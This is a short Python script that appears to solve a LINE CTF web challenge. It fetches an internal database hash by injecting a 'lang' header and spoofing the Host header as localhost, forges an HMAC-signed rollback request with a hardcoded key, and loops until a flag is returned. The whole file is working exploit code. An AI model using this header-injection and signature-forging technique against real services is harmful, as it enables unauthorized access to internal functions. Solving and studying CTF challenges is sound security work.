import hashlib
import hmac
import json

import requests

host = 'http://xxx.xxx.xxx.xxx'
privateKey = b'let\'sbitcorinparty'

def get_dbhash():
  headers = {'lang': 'integrityStatus', 'host': 'localhost:5000'}
  res = requests.get(f'{host}/apis/coin', headers=headers)
  return json.loads(res.headers['lang'])['dbhash']

def dbhash2key(dbhash):
  return hashlib.sha512((dbhash).encode('ascii')).hexdigest()

def get_flag(dbhash, key):
  query_string = f'dbhash={dbhash}'.encode()
  sign = hmac.new(privateKey, query_string, hashlib.sha512).hexdigest()
  headers = {'Lang': f'rollback?dbhash={dbhash}', 'host': 'localhost:5000', 'Sign': sign, 'Key': key}
  res = requests.get(f'{host}/apis/coin', headers=headers)
  return res.headers['lang']

if __name__ == '__main__':
  flag = ''

  while not flag.startswith('LINECTF'):
    target_hash = get_dbhash()
    dbhash = target_hash
    while dbhash == target_hash:
      dbhash = get_dbhash()
    key = dbhash2key(dbhash)
    flag = get_flag(target_hash, key)

  print(flag)
